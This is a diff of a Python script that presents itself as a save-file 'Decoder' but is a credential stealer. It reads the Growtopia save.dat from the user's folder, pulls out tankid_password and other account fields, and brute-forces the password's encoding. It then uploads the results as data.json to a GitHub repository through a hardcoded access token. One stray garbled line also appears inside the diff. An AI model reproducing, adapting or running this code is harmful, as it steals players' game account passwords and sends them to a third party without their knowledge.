@@ -1,7 +1,7 @@
 import os
 import json
+import base64
 import requests
-from base64 import b64encode
 from pprint import pprint
 
 class Decoder:
@@ -13,76 +13,109 @@ class Decoder:
         "defaultLogHeight", "Client", "meta", "rid", "touch", "rememberZoom",
         "sendSkinColor", "zoomSave", "addJump", "skinColor"
     ]
-    
+    pTypes = ["checkbox", "slider", "edit", "color", "password", "unknown"]
+    pType = [
+        5, 5, 5, 5, 5, 0, 5, 5, 5, 2, 2, 0, 2, 4, 0, 5, 5, 5, 2, 2, 0, 0, 5, 5, 0, 5
+    ]
+    defValues = [1, 4, 16, 64, 256, 1024]
+    pChars = ""
+    pSize = 0
+    Positions = []
+    PositionLength = []
+    useFilter = True
+
     def __init__(self):
-        self.file_path = self.get_default_path()
-        self.data = {}
+        self.openFile(self.get_default_path())
 
     def get_default_path(self):
         user_path = os.path.expanduser("~")
         return os.path.join(user_path, "AppData", "Local", "Growtopia", "save.dat")
 
-    def read_save_file(self):
+    def openFile(self, path):
         try:
-            with open(self.file_path, "rb") as file:
+            with open(path, 'rb') as file:
                 content = file.read()
-                return content.decode("latin-1", errors="ignore")
+                self.pSize = len(content)
+                self.pChars = content.decode('latin-1', errors='ignore')
+                return True
         except Exception as e:
-            print(f"Error reading save file: {e}")
-            return None
+            print(f"An error occurred while reading save file: {e}")
+            return False
 
-    def decode_file(self):
-        file_content = self.read_save_file()
-        if not file_content or "tankid_password" not in file_content:
-            return {"Error": "Could not find tankid_password in save.dat"}
+    def DecodeFile(self):
+        if not self.pChars or "tankid_password" not in self.pChars:
+            return {"Error": "An error occurred while searching for tankid_password"}
 
-        extracted_data = {}
-        for value in self.Values:
-            start = file_content.find(value)
-            if start != -1:
-                extracted_data[value] = "Found"
+        self.Positions.clear()
+        self.PositionLength.clear()
+        for i, value in enumerate(self.Values):
+            start = self.pChars.find(value)
+            self.Positions.append(start)
 
-        return extracted_data
+        content = {}
+        for i, pos in enumerate(self.Positions):
+            if pos != -1 and self.pType[i] != 5:
+                content[self.Values[i]] = self.ListTrigger(i)
+        return content
 
-    def save_to_json(self, filename="data.json"):
-        with open(filename, "w") as json_file:
-            json.dump(self.data, json_file, indent=4)
+    def ListTrigger(self, value):
+        if value >= len(self.Values):
+            return "Value pointer overflow"
+        pType = self.pType[value]
+        pos = self.Positions[value]
+        if pType == 2:
+            stringLength = ord(self.pChars[pos])
+            return self.pChars[pos + 4: pos + 4 + stringLength]
+        elif pType == 4:
+            stringLength = ord(self.pChars[pos])
+            passwordBuffer = self.pChars[pos + 4: pos + 4 + stringLength]
+            return self.decodePassword(passwordBuffer, True)
+        else:
+            return "unknown type id!"
 
-    def upload_to_github(self):
+    def decodePassword(self, password, file):
+        result = []
+        password = password.replace('rid', '')
+
+        for offset in range(-128, 128):
+            buffer = ""
+            for i in range(len(password)):
+                cbuffer = (ord(password[i]) + offset - (i if file else 0)) % 255
+                buffer += chr(cbuffer)
+            if len(buffer) >= len(password):
+                result.append(buffer)
+        return result
+
+    def save_to_github(self, data):
         GITHUB_TOKEN = "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"
         REPO_OWNER = "Pieraye"
         REPO_NAME = "Scriptsi"
         FILE_PATH = "data.json"
+        API_URL = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
 
-        api_url = f"https://api.github.com/repos/{REPO_OWNER}/{REPO_NAME}/contents/{FILE_PATH}"
-        headers = {"Authorization": f"token {GITHUB_TOKEN}", "Accept": "application/vnd.github.v3+json"}
-
-        # Get current file SHA (if exists)
-        response = requests.get(api_url, headers=headers)
-        sha = response.json().get("sha", None)
-@&PiErayers19
-        # Encode data.json in Base64
-        with open(FILE_PATH, "rb") as file:
-            content = b64encode(file.read()).decode()
-
-        data = {
-            "message": "Updated data.json",
-            "content": content,
-            "sha": sha  # Required if updating an existing file
+        headers = {
+            "Authorization": f"token {GITHUB_TOKEN}",
+            "Accept": "application/vnd.github.v3+json"
         }
 
-        # Send the request
-        response = requests.put(api_url, headers=headers, json=data)
-        if response.status_code in [200, 201]:
-            print("Successfully updated data.json on GitHub!")
-        else:
-            print(f"GitHub API Error: {response.json()}")
+        # Get current file SHA if it exists
+        response = requests.get(API_URL, headers=headers)
+        sha = response.json().get("sha") if response.status_code == 200 else None
 
-    def run(self):
-        self.data = self.decode_file()
-        self.save_to_json()
-        self.upload_to_github()
+        # Upload new file
+        payload = {
+            "message": "Update data.json",
+            "content": base64.b64encode(json.dumps(data, indent=4).encode()).decode(),
+            "sha": sha
+        }
+        response = requests.put(API_URL, headers=headers, json=payload)
+        if response.status_code in [200, 201]:
+            print("Successfully uploaded to GitHub!")
+        else:
+            print("Failed to upload:", response.json())
 
 if __name__ == "__main__":
     decoder = Decoder()
-    decoder.run()
+    decoded_content = decoder.DecodeFile()
+    pprint(decoded_content)
+    decoder.save_to_github(decoded_content)
